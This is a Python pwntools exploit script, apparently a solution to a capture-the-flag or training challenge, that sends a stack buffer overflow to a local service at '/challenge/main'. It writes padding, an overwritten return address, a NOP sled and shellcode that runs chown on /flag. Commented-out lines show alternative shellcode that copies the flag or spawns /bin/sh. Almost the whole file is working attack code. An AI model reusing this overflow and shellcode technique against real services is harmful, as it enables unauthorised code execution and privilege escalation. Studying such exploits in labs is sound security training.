import socket
import time
import _thread
import os
from pwn import *

MaxBytes=1024*1024
host ='127.0.0.1'
port = 1234

p = process(argv=['/challenge/main', '-p', str(port)])

def getCode():
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    # sc = shellcraft.execve(path="/bin/cp", argv=["/bin/cp","/flag", "/home/hacker/flag.38"])
    sc = shellcraft.execve(path="/bin/chown", argv=["/bin/chown","hacker","/flag"])
    return asm(sc)

def connect():
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.settimeout(30)
    client.connect((host,port))
    print(f"连接成功.{client}")
    return client

def send(client,data : bytes):
    count = client.send(data)
    print(f"数据发送成功，共发送{len(data)}字节.")

def receive(client):
    while True:
        data = client.recv(MaxBytes)
        if data:
            print(f"Recive data:{data}:len:{len(data)}")
        
def readFile():
    f = open("input39", mode='rb+')
    data = f.read()
    f.close()
    return data
 
def writFile():
    #rip 0x7fffffffe508
    #buffer 0x7fffffffe4e0
    #shellcode=b'\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
    shellcode = getCode()
    addr =0x7FFFFFFFE75E #rip+256
    data=[]
    for i in range(0,40):
        data.append(0x31)
    bs = addr.to_bytes(8,'little',signed=False)
    for i in bs:
        data.append(i) #write return address
    for i in range(0,512): #write padding
        data.append(0x90)
    for b in shellcode: #write shellcode
        data.append(b)
    data.append(0x0a)#结束符号
    f = open("input39", mode='wb+')
    print(os.path.abspath(f.name))
    bs = bytes(data)
    f.write(bs)
    f.close()
    print(f"写文件成功,共写入{len(data)}个字节.")
    
        

if __name__=='__main__':
    writFile()
    conn = connect()
    _thread.start_new_thread(receive,(conn,))
    input()
    data  = readFile()
    send(conn,data)
    input()
    
    
